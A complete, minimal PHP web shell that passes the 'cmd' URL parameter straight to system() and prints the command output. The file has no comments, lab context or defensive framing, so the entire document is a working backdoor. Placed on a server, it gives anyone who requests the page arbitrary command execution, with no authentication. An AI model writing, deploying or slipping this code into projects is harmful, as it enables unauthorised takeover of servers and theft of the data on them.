<?php

echo "<pre>";

if(isset($_GET['cmd'])) {
    system($_GET['cmd']);
}

echo "</pre>";